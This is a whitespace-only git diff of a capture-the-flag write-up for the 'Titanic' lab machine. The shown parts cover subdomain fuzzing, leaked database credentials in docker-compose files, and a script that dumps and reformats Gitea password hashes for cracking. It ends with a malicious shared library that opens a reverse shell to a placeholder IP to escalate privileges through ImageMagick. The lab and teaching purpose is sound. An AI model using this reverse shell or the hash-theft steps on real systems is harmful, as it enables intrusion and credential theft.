@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 
 
 # RECONNAISSANCE
@@ -102,29 +102,29 @@ I tried to brute force this user but there was no results, seems like we are mis
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -H "Host:FUZZ.titanic.htb" -fc 301 -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://titanic.htb/
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.titanic.htb
+ :: Method : GET
+ :: URL : http://titanic.htb/
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header : Host: FUZZ.titanic.htb
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response status: 301
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Response status: 301
 ________________________________________________
 
-dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 123ms]
+dev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 123ms]
 ```
 
 We found a subdomain, let's add it to `/etc/hosts`:
@@ -158,17 +158,17 @@ We find this:
 version: '3.8'
 
 services:
-  mysql:
-    image: mysql:8.0
-    container_name: mysql
-    ports:
-      - "127.0.0.1:3306:3306"
-    environment:
-      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
-      MYSQL_DATABASE: tickets 
-      MYSQL_USER: sql_svc
-      MYSQL_PASSWORD: sql_password
-    restart: always
+ mysql:
+ image: mysql:8.0
+ container_name: mysql
+ ports:
+ - "127.0.0.1:3306:3306"
+ environment:
+ MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+ MYSQL_DATABASE: tickets 
+ MYSQL_USER: sql_svc
+ MYSQL_PASSWORD: sql_password
+ restart: always
 ```
 
 And also this:
@@ -180,18 +180,18 @@ And also this:
 version: '3'
 
 services:
-  gitea:
-    image: gitea/gitea
-    container_name: gitea
-    ports:
-      - "127.0.0.1:3000:3000"
-      - "127.0.0.1:2222:22"  # Optional for SSH access
-    volumes:
-      - /home/developer/gitea/data:/data # Replace with your path
-    environment:
-      - USER_UID=1000
-      - USER_GID=1000
-    restart: always
+ gitea:
+ image: gitea/gitea
+ container_name: gitea
+ ports:
+ - "127.0.0.1:3000:3000"
+ - "127.0.0.1:2222:22" # Optional for SSH access
+ volumes:
+ - /home/developer/gitea/data:/data # Replace with your path
+ environment:
+ - USER_UID=1000
+ - USER_GID=1000
+ restart: always
 ```
 
 Now, knowing we are dealing with `gitea`, once we do the research, we find the configuration file is located at `/data/gitea/conf/app.ini`, we can make use of the `LFI` to read the file:
@@ -319,62 +319,62 @@ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do diges
 
 1. **Extract Data from SQLite**
 2. 
-    `sqlite3 gitea.db "select passwd,salt,name from user"`
-    
-    - Queries theÂ `user`Â table inÂ `gitea.db`Â and returns three columns:
-        
-        - `passwd`: Password hash (stored as hex).
-            
-        - `salt`: Salt used for hashing (stored as hex).
-            
-        - `name`: Username.
-            
+ `sqlite3 gitea.db "select passwd,salt,name from user"`
+ 
+ - Queries the`user` table in`gitea.db` and returns three columns:
+ 
+ - `passwd`: Password hash (stored as hex).
+ 
+ - `salt`: Salt used for hashing (stored as hex).
+ 
+ - `name`: Username.
+ 
 2. **Process Each Line**
-    
-    `while read data; do ... done`
-    - Loops through each line of the SQL query result (e.g.,Â `hash|salt|username`).
-        
+ 
+ `while read data; do ... done`
+ - Loops through each line of the SQL query result (e.g.,`hash|salt|username`).
+ 
 3. **Decode the Password Hash**
-    
-    `digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)`
-    
-    - `cut -d'|' -f1`: Extracts the first field (`passwd`Â hex string).
-        
-    - `xxd -r -p`: Converts hex to raw binary.
-        
-    - `base64`: Encodes the binary hash as base64.
-        
-    - Final result: Base64-encoded password hash.
-        
+ 
+ `digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)`
+ 
+ - `cut -d'|' -f1`: Extracts the first field (`passwd` hex string).
+ 
+ - `xxd -r -p`: Converts hex to raw binary.
+ 
+ - `base64`: Encodes the binary hash as base64.
+ 
+ - Final result: Base64-encoded password hash.
+ 
 4. **Decode the Salt**
-    
-    `salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)`
-    
-    - Same process as above, but extracts the second field (`salt`).
-        
+ 
+ `salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)`
+ 
+ - Same process as above, but extracts the second field (`salt`).
+ 
 5. **Extract Username**
-    
-    `name=$(echo $data | cut -d'|' -f 3)`
-    
-    - `cut -d'|' -f3`: Gets the third field (`name`).
-        
+ 
+ `name=$(echo $data | cut -d'|' -f 3)`
+ 
+ - `cut -d'|' -f3`: Gets the third field (`name`).
+ 
 6. **Format for Password Cracking**
 
-    `echo "${name}:sha256:50000:${salt}:${digest}"`
-    
-    
-    - Outputs the data in the format:
-        username:sha256:50000:<base64_salt>:<base64_digest>
-        
-        - `sha256`: Hashing algorithm (PBKDF2-SHA256 in Gitea).
-            
-        - `50000`: Number of iterations.
-            
+ `echo "${name}:sha256:50000:${salt}:${digest}"`
+ 
+ 
+ - Outputs the data in the format:
+ username:sha256:50000:<base64_salt>:<base64_digest>
+ 
+ - `sha256`: Hashing algorithm (PBKDF2-SHA256 in Gitea).
+ 
+ - `50000`: Number of iterations.
+ 
 7. **Save Output**
-    
-    `| tee gitea.hashes`
-    
-    - Writes the formatted hashes toÂ `gitea.hashes`Â and displays them on the terminal.
+ 
+ `| tee gitea.hashes`
+ 
+ - Writes the formatted hashes to`gitea.hashes` and displays them on the terminal.
 ```
 
 
@@ -448,24 +448,24 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 
 
 ```ad-important
-This script automates the extraction of metadata from allÂ `.jpg`Â files in theÂ `/opt/app/static/assets/images`Â directory and logs the results toÂ `metadata.log`.
+This script automates the extraction of metadata from all`.jpg` files in the`/opt/app/static/assets/images` directory and logs the results to`metadata.log`.
 
-1. **Navigate to Images Directory**:  
-    `cd /opt/app/static/assets/images`  
-    Moves to the directory containing image files.
-    
-2. **Reset Log File**:  
-    `truncate -s 0 metadata.log`  
-    Clears the existingÂ `metadata.log`Â (or creates an empty file).
-    
-3. **Extract Metadata**:  
-    `find ... | xargs /usr/bin/magick identify >> metadata.log`
-    
-    - UsesÂ `find`Â to list allÂ `.jpg`Â files recursively.
-        
-    - RunsÂ `magick identify`Â (ImageMagick) to extract metadata (e.g., dimensions, format, EXIF data).
-        
-    - Appends the results toÂ `metadata.log`.
+1. **Navigate to Images Directory**: 
+ `cd /opt/app/static/assets/images` 
+ Moves to the directory containing image files.
+ 
+2. **Reset Log File**: 
+ `truncate -s 0 metadata.log` 
+ Clears the existing`metadata.log` (or creates an empty file).
+ 
+3. **Extract Metadata**: 
+ `find ... | xargs /usr/bin/magick identify >> metadata.log`
+ 
+ - Uses`find` to list all`.jpg` files recursively.
+ 
+ - Runs`magick identify` (ImageMagick) to extract metadata (e.g., dimensions, format, EXIF data).
+ 
+ - Appends the results to`metadata.log`.
 ```
 
 So, knowing this, we can check the version of the binary:
@@ -501,8 +501,8 @@ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <unistd.h>
 
 __attribute__((constructor)) void init(){
-    system("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
-    exit(0);
+ system("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
+ exit(0);
 }
 EOF
 ```
